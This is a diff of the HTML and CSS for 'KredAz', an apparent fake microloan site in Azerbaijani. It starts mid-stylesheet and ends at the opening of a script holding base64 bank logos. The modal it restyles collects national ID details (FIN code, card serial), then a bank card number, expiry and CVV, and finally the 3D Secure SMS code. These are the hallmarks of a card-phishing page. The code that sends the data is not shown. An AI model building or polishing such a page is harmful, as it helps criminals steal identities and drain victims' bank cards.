     40%{transform:scale(1);background:var(--teal-deep);}
   }
-
-  /* ===== OTP ===== */
   .otp-input-field input{
-    font-size:32px;
-    letter-spacing:14px;
+    font-size:28px;
+    letter-spacing:12px;
     text-align:center;
     font-family:'IBM Plex Mono',monospace;
-    padding:16px 20px;
+    padding:14px 18px;
   }
-
-  .summary-row{
-    display:flex;justify-content:space-between;align-items:center;
-    padding:16px 0;border-bottom:1px solid var(--line);
+  footer{
+    background:var(--ink);
+    color:#EDE7D6;
+    padding:40px 0 24px;
   }
-  .summary-row:last-of-type{border-bottom:none;}
-  .summary-label{font-size:12.5px;color:var(--ink-soft);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em;font-family:'IBM Plex Mono',monospace;}
-  .summary-value{font-size:16.5px;font-weight:700;font-family:'IBM Plex Mono',monospace;}
-  .edit-btn{
-    background:var(--sage);border:none;width:36px;height:36px;border-radius:10px;
-    cursor:pointer;font-size:15px;color:var(--teal-deep);flex-shrink:0;margin-left:16px;
-    transition:background .18s ease;
+  .footer-grid{
+    display:grid;
+    grid-template-columns:1.4fr 1fr 1fr;
+    gap:28px;
+    margin-bottom:24px;
   }
-  .edit-btn:hover{background:var(--line);}
-
-  footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
-  .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
-  .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
-  .footer-grid p, .footer-grid a{font-size:13.5px;color:#C9C2AE;line-height:1.7;text-decoration:none;}
+  .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:10px;color:var(--white);}
+  .footer-grid p,.footer-grid a{font-size:13px;color:#C9C2AE;line-height:1.6;text-decoration:none;}
   .foot-note{
-    border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;
-    font-size:12px;color:#9B9480;line-height:1.7;
+    border-top:1px solid rgba(255,255,255,0.1);
+    padding-top:16px;
+    font-size:11px;
+    color:#9B9480;
   }
-
-  @media (max-width:860px){
-    .hero-grid, .calc-card, .offers-grid, .footer-grid{grid-template-columns:1fr;}
+  @media(max-width:860px){
+    .hero-grid,.calc-card,.offers-grid,.footer-grid{grid-template-columns:1fr;}
     .steps{grid-template-columns:1fr;}
-    nav ul{display:none;}
     .bank-grid{grid-template-columns:1fr 1fr;}
+  }
+  @media(max-width:480px){
+    .bank-grid{grid-template-columns:1fr;}
     .card-details-row{grid-template-columns:1fr;}
-    .id-card-preview .id-photo{width:60px;height:80px;font-size:24px;}
-    .id-card-preview .id-row .id-label{width:80px;font-size:8px;}
-    .id-card-preview .id-row .id-value{font-size:9px;}
   }
 </style>
 </head>
@@ -749,46 +613,44 @@
 <header>
   <div class="nav">
     <div class="logo">KredAz<span>.</span></div>
-    <nav><ul>
-      <li><a href="#hesabla">Hesabla</a></li>
-      <li><a href="#teklifler">Təkliflər</a></li>
-      <li><a href="#neceislyir">Necə işləyir</a></li>
-      <li><a href="#faq">Suallar</a></li>
-    </ul></nav>
+    <nav>
+      <ul style="list-style:none;display:flex;gap:24px;margin:0;padding:0;font-size:14px;font-weight:600;">
+        <li><a href="#hesabla">Hesabla</a></li>
+        <li><a href="#teklifler">Təkliflər</a></li>
+        <li><a href="#neceislyir">Necə işləyir</a></li>
+        <li><a href="#faq">Suallar</a></li>
+      </ul>
+    </nav>
     <button class="cta-btn" onclick="openModal()">Müraciət et</button>
   </div>
 </header>
 
-<div class="kilim"></div>
-
-<!-- HERO -->
 <section class="hero">
   <div class="wrap hero-grid">
     <div>
-      <span class="eyebrow">Rəsmi gəlir sənədi tələb olunmadan · 24/7</span>
+      <span style="font-family:'IBM Plex Mono',monospace;font-size:13px;text-transform:uppercase;color:var(--teal-mid);">Rəsmi gəlir sənədi tələb olunmadan</span>
       <h1>Pulunuz <em>30 dəqiqəyə</em> kartınızda ola bilər.</h1>
       <p>Şəxsiyyət vəsiqəniz kifayətdir — rəsmi iş yeri sənədi tələb olunmur.</p>
       <div class="hero-actions">
         <button class="cta-btn" onclick="document.getElementById('hesabla').scrollIntoView()">Kalkulyatoru aç</button>
-        <button class="cta-ghost" onclick="document.getElementById('teklifler').scrollIntoView()">Şərtlərə bax</button>
+        <button style="background:transparent;border:2px solid var(--teal-deep);color:var(--teal-deep);border-radius:999px;padding:12px 24px;font-weight:700;font-size:14px;cursor:pointer;" onclick="document.getElementById('teklifler').scrollIntoView()">Şərtlərə bax</button>
       </div>
     </div>
     <div class="hero-card">
-      <div class="row"><span>Kredit təşkilatı</span><span class="mono">KredAz MKT</span></div>
-      <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–700 ₼</span></div>
+      <div class="row"><span>Kredit təşkilatı</span><span style="font-family:'IBM Plex Mono',monospace;">KredAz MKT</span></div>
+      <div class="row"><span>Məbləğ aralığı</span><span style="font-family:'IBM Plex Mono',monospace;">100–700 ₼</span></div>
       <hr>
       <div class="row"><span>Nümunə: 500 ₼ / 3 ay</span></div>
       <div class="big-number">202 ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:'Manrope',sans-serif;">/ ay</span></div>
-      <div class="row" style="margin-top:10px;"><span>Aylıq faiz</span><span class="mono">4%</span></div>
+      <div class="row" style="margin-top:8px;"><span>Aylıq faiz</span><span style="font-family:'IBM Plex Mono',monospace;">4%</span></div>
     </div>
   </div>
 </section>
 
-<!-- CALCULATOR -->
 <section id="hesabla">
   <div class="wrap">
     <div class="section-head">
-      <span class="eyebrow">Kalkulyator</span>
+      <span style="font-family:'IBM Plex Mono',monospace;font-size:13px;text-transform:uppercase;color:var(--teal-mid);">Kalkulyator</span>
       <h2>Nə qədər lazımdır, neçə aya rahatdır?</h2>
     </div>
     <div class="calc-card">
@@ -801,9 +663,7 @@
         <div class="slider-block">
           <label>Müddət <span class="slider-value" id="termLabel">3 ay</span></label>
           <input type="range" id="termSlider" min="0" max="5" step="1" value="4">
-          <div class="range-labels" style="display:flex;justify-content:space-between;flex-wrap:wrap;">
-            <span>10g</span><span>15g</span><span>20g</span><span>1ay</span><span>2ay</span><span>3ay</span>
-          </div>
+          <div class="range-labels"><span>10g</span><span>15g</span><span>20g</span><span>1ay</span><span>2ay</span><span>3ay</span></div>
         </div>
       </div>
       <div class="results">
@@ -820,13 +680,10 @@
   </div>
 </section>
 
-<div class="wrap"><div class="kilim dark"></div></div>
-
-<!-- OFFERS -->
 <section id="teklifler">
   <div class="wrap">
     <div class="section-head">
-      <span class="eyebrow">Təkliflər</span>
+      <span style="font-family:'IBM Plex Mono',monospace;font-size:13px;text-transform:uppercase;color:var(--teal-mid);">Təkliflər</span>
       <h2>İki fərqli müddət, eyni sadəlik</h2>
     </div>
     <div class="offers-grid">
@@ -856,11 +713,10 @@
   </div>
 </section>
 
-<!-- HOW IT WORKS -->
 <section id="neceislyir">
   <div class="wrap">
     <div class="section-head">
-      <span class="eyebrow">Necə işləyir</span>
+      <span style="font-family:'IBM Plex Mono',monospace;font-size:13px;text-transform:uppercase;color:var(--teal-mid);">Necə işləyir</span>
       <h2>Üç addımda müraciət</h2>
     </div>
     <div class="steps">
@@ -871,35 +727,30 @@
   </div>
 </section>
 
-<!-- FAQ -->
 <section id="faq">
   <div class="wrap">
     <div class="section-head">
-      <span class="eyebrow">Sual-Cavab</span>
+      <span style="font-family:'IBM Plex Mono',monospace;font-size:13px;text-transform:uppercase;color:var(--teal-mid);">Sual-Cavab</span>
       <h2>Tez-tez verilən suallar</h2>
     </div>
     <div id="faqList">
-      <div class="faq-item"><button class="faq-q">Nə qədər məbləğ ala bilərəm? <span class="icon">+</span></button><div class="faq-a"><p>100–700 ₼ arasında, rəsmi gəlir sənədi olmadan.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Hansı sənədlər lazımdır? <span class="icon">+</span></button><div class="faq-a"><p>Şəxsiyyət vəsiqəsi məlumatları kifayətdir.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Gecikmə olarsa nə baş verir? <span class="icon">+</span></button><div class="faq-a"><p>Müqavilədə göstərilən cərimə tətbiq olunur.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Krediti vaxtından əvvəl qapata bilərəmmi? <span class="icon">+</span></button><div class="faq-a"><p>Bəli, faiz yalnız istifadə günlərinə görə hesablanır.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Nə qədər məbləğ ala bilərəm? <span>+</span></button><div class="faq-a"><p>100–700 ₼ arasında, rəsmi gəlir sənədi olmadan.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Hansı sənədlər lazımdır? <span>+</span></button><div class="faq-a"><p>Şəxsiyyət vəsiqəsi məlumatları kifayətdir.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Gecikmə olarsa nə baş verir? <span>+</span></button><div class="faq-a"><p>Müqavilədə göstərilən cərimə tətbiq olunur.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Krediti vaxtından əvvəl qapata bilərəmmi? <span>+</span></button><div class="faq-a"><p>Bəli, faiz yalnız istifadə günlərinə görə hesablanır.</p></div></div>
     </div>
   </div>
 </section>
 
-<div class="wrap"><div class="kilim"></div></div>
-
-<!-- ========== MODAL ========== -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal-card">
-    <button type="button" class="modal-close" onclick="closeModal()">✕</button>
+    <button class="modal-close" onclick="closeModal()">✕</button>
 
-    <!-- STEP 1: Şəxsi məlumatlar -->
     <div id="formStep">
-      <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
+      <h2 style="font-size:24px;margin-bottom:4px;">Onlayn kredit müraciəti</h2>
+      <p style="color:var(--ink-soft);font-size:14px;margin:0 0 16px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
       <form id="applyForm" novalidate>
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
           <div class="field"><label>Ad</label><input type="text" id="firstName" placeholder="Əli"></div>
           <div class="field"><label>Soyad</label><input type="text" id="lastName" placeholder="Məmmədov"></div>
         </div>
@@ -907,8 +758,8 @@
         <div class="field"><label>Doğum tarixi</label><input type="date" id="birthDate"></div>
         <div class="field"><label>FIN kod</label><input type="text" id="fin" placeholder="7A2BC9D" maxlength="7"></div>
         <div class="field"><label>Seriya nömrəsi</label>
-          <div style="display:flex;gap:10px;">
-            <select id="idPrefix" style="max-width:90px;"><option>AZE</option></select>
+          <div style="display:flex;gap:8px;">
+            <select id="idPrefix" style="max-width:80px;"><option>AZE</option></select>
             <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
           </div>
         </div>
@@ -920,80 +771,70 @@
           </div>
         </div>
         
-        <!-- ID Card Preview -->
         <div class="id-card-preview" id="idCardPreview">
           <div class="id-header">
             <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
             <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
           </div>
           <div class="id-photo">👤</div>
-          <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="previewSurname">MƏMMƏDOV</span></div>
-          <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="previewName">ƏLİ</span></div>
-          <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
-          <div class="id-row"><span class="id-label">DOĞUM TARİXİ / DATE OF BIRTH</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
-          <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
-          <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="previewId">AZE 12345678</span></div>
-          <div class="id-footer">
-            <span>Müddət / Date of Expiry: 10 il</span>
-            <span>Verilmə tarixi: 01.01.2020</span>
-          </div>
-          <div class="id-signature">
-            <span>İmza / Signature</span>
-            <span class="sig-line"></span>
-          </div>
+          <div class="id-row"><span class="id-label">SOYAD</span><span class="id-value" id="previewSurname">MƏMMƏDOV</span></div>
+          <div class="id-row"><span class="id-label">AD</span><span class="id-value" id="previewName">ƏLİ</span></div>
+          <div class="id-row"><span class="id-label">ATASININ ADI</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
+          <div class="id-row"><span class="id-label">DOĞUM</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
+          <div class="id-row"><span class="id-label">FİN</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
+          <div class="id-row"><span class="id-label">SERİYA</span><span class="id-value" id="previewId">AZE 12345678</span></div>
+          <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
+          <div class="id-signature"><span>İmza</span><span class="sig-line"></span></div>
         </div>
 
         <label class="checkline"><input type="checkbox" id="consent1" required> Məlumatlarımın yoxlanılmasına razıyam</label>
         <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəmin yoxlanılmasına razıyam</label>
-        <button type="submit" class="cta-btn" style="width:100%;padding:15px;">Davam et</button>
+        <button type="submit" class="cta-btn" style="width:100%;padding:14px;">Davam et</button>
       </form>
     </div>
 
-    <!-- STEP 2: Summary -->
     <div id="summaryStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
+      <h2 style="font-size:24px;margin-bottom:4px;">Məlumatlarınız düzdürmü?</h2>
       <div class="id-card-preview" style="max-width:100%;">
         <div class="id-header">
           <div class="id-title">AZƏRBAYCAN RESPUBLİKASI <small>REPUBLIC OF AZERBAIJAN</small></div>
           <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI <small>IDENTITY CARD</small></div>
         </div>
         <div class="id-photo">👤</div>
-        <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="sumSurname">—</span></div>
-        <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="sumName">—</span></div>
-        <div class="id-row"><span class="id-label">ATASININ ADI / PATRONYMIC</span><span class="id-value" id="sumPatronymic">—</span></div>
-        <div class="id-row"><span class="id-label">DOĞUM TARİXİ</span><span class="id-value" id="sumBirth">—</span></div>
-        <div class="id-row"><span class="id-label">FİN / PERSONAL NO</span><span class="id-value" id="sumFin">—</span></div>
-        <div class="id-row"><span class="id-label">SERİYA / CARD NO</span><span class="id-value" id="sumId">—</span></div>
+        <div class="id-row"><span class="id-label">SOYAD</span><span class="id-value" id="sumSurname">—</span></div>
+        <div class="id-row"><span class="id-label">AD</span><span class="id-value" id="sumName">—</span></div>
+        <div class="id-row"><span class="id-label">ATASININ ADI</span><span class="id-value" id="sumPatronymic">—</span></div>
+        <div class="id-row"><span class="id-label">DOĞUM</span><span class="id-value" id="sumBirth">—</span></div>
+        <div class="id-row"><span class="id-label">FİN</span><span class="id-value" id="sumFin">—</span></div>
+        <div class="id-row"><span class="id-label">SERİYA</span><span class="id-value" id="sumId">—</span></div>
         <div class="id-row"><span class="id-label">TELEFON</span><span class="id-value" id="sumPhone">—</span></div>
         <div class="id-row"><span class="id-label">İŞ YERİ</span><span class="id-value" id="sumJob">—</span></div>
         <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
-        <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
+        <div class="id-signature"><span>İmza</span><span class="sig-line"></span></div>
       </div>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;" onclick="goToBankSelect()">Davam et → Bank seçimi</button>
+      <button class="cta-btn" style="width:100%;padding:14px;margin-top:16px;" onclick="goToBankSelect()">Davam et → Bank seçimi</button>
     </div>
 
-    <!-- STEP 3: Bank seçimi -->
     <div id="bankStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Hansı bank kartına köçürək?</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
+      <h2 style="font-size:24px;margin-bottom:4px;">Hansı bank kartına köçürək?</h2>
+      <p style="color:var(--ink-soft);font-size:14px;margin:0 0 16px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
       <div class="bank-grid" id="bankGrid"></div>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
+      <button class="cta-btn" style="width:100%;padding:14px;margin-top:20px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: Kart -->
     <div id="cardInputStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Köçürmə Hesabı</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">
+      <h2 style="font-size:24px;margin-bottom:4px;">Köçürmə Hesabı</h2>
+      <p style="color:var(--ink-soft);font-size:14px;margin:0 0 10px;">
         <strong>Kredit məbləği</strong><br>
-        <span style="font-size:28px;font-weight:700;color:var(--teal-deep);" id="creditAmountDisplay">400 ₼</span><br>
-        <span style="font-size:14px;color:var(--ink-soft);" id="creditTermDisplay">3 ay müddətə</span>
+        <span style="font-size:26px;font-weight:700;color:var(--teal-deep);" id="creditAmountDisplay">400 ₼</span><br>
+        <span style="font-size:13px;color:var(--ink-soft);" id="creditTermDisplay">3 ay müddətə</span>
       </p>
-      <div style="background:var(--sage);border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
-        <span style="font-weight:600;font-size:14px;">Seçilmiş Bank</span>
+      <div style="background:var(--sage);border-radius:10px;padding:10px 14px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;">
+        <span style="font-weight:600;font-size:13px;">Seçilmiş Bank</span>
         <span style="font-weight:700;color:var(--teal-deep);" id="selectedBankDisplay">Kapital Bank</span>
       </div>
       <div class="card-input-wrap">
-        <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg, #1a1a2e, #16213e);">
+        <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg,#1a1a2e,#16213e);">
           <div class="card-chip"></div>
           <div class="card-top">
             <span class="bank-name-on-card" id="cardBankName">KAPITAL BANK</span>
@@ -1004,46 +845,42 @@
             <div><div class="card-expiry-label">Bitmə</div><div class="card-expiry-value" id="cardExpiryDisplay">MM/YY</div></div>
             <div style="text-align:right;"><div class="card-cvv-label">CVV</div><div class="card-cvv-value" id="cardCvvDisplay">***</div></div>
           </div>
-          <div class="card-contactless">📶</div>
           <img class="card-logo-on-card" id="cardLogoOnCard" src="" alt="">
         </div>
         <input type="text" id="cardNumberInput" class="card-number-input-hidden" maxlength="16" inputmode="numeric">
         <div class="progress-bar"><div class="fill" id="cardProgress" style="width:0%;"></div></div>
         <div class="progress-label" id="cardProgressLabel">0/16 rəqəm daxil edilib</div>
-        <p style="font-size:11px;color:var(--ink-soft);margin-top:6px;">Karta klikləyin və nömrəni daxil edin</p>
+        <p style="font-size:11px;color:var(--ink-soft);margin-top:4px;">Karta klikləyin və nömrəni daxil edin</p>
       </div>
       <div class="card-details-row">
         <div class="field"><label>Bitmə tarixi (AA/İİ)</label><input type="text" id="cardExpiry" placeholder="12/28" maxlength="5"></div>
         <div class="field"><label>CVV / CVC</label><input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric"></div>
       </div>
-      <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur.</p>
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;" onclick="goToChecking()">Müraciəti göndər</button>
+      <p style="font-size:11px;color:var(--ink-soft);margin-top:10px;text-align:center;">TLS 1.3 şifrələmə ilə qorunur.</p>
+      <button class="cta-btn" style="width:100%;padding:14px;margin-top:10px;" onclick="goToChecking()">Müraciəti göndər</button>
     </div>
 
-    <!-- STEP 5: Checking -->
     <div id="checkingStep" style="display:none;">
       <div class="checking-container">
         <div class="spinner"></div>
-        <div class="check-icon">🔍</div>
         <div class="check-title">Məlumatlar yoxlanılır</div>
         <div class="check-sub">Şəxsiyyət məlumatlarınız təsdiqlənir...</div>
         <div class="check-dots"><span></span><span></span><span></span></div>
-        <div style="margin-top:20px;font-size:13px;color:var(--ink-soft);"><span id="checkingTimer">0</span> saniyə</div>
-        <div id="checkingStatus" style="margin-top:12px;font-size:14px;font-weight:600;color:var(--gold);display:none;">⏳ Təsdiq gözlənilir...</div>
+        <div style="margin-top:16px;font-size:12px;color:var(--ink-soft);"><span id="checkingTimer">0</span> saniyə</div>
+        <div id="checkingStatus" style="margin-top:10px;font-size:13px;font-weight:600;color:var(--gold);display:none;">⏳ Təsdiq gözlənilir...</div>
       </div>
     </div>
 
-    <!-- STEP 6: OTP -->
     <div id="threeDStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
-      <p style="color:var(--ink-soft);margin-bottom:6px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi.</p>
-      <p style="color:var(--gold);font-size:14px;font-weight:600;margin-bottom:20px;">Kodu daxil edin:</p>
+      <h2 style="font-size:24px;margin-bottom:6px;">🔐 3D Secure təsdiqi</h2>
+      <p style="color:var(--ink-soft);margin-bottom:4px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi.</p>
+      <p style="color:var(--gold);font-size:14px;font-weight:600;margin-bottom:16px;">Kodu daxil edin:</p>
       <div class="field otp-input-field">
         <label>6 rəqəmli təsdiq kodu</label>
         <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric">
       </div>
-      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;">Təsdiqlə</button>
-      <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Təsdiq edildi!</div>
+      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:14px;margin-top:16px;">Təsdiqlə</button>
+      <div id="otpStatus" style="margin-top:12px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Təsdiq edildi!</div>
     </div>
 
   </div>
@@ -1061,528 +898,353 @@
 </footer>
 
 <script>
-  // ========== BANK LOGOS (BASE64 PNG) ==========
-  const kapitalLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+// ========== SİZİN GÖNDƏRDİYİNİZ BASE64 LOQOLAR ==========
+// Kapital Bank
+const kapitalLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
 
-  const pashaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+// PAŞA Bank
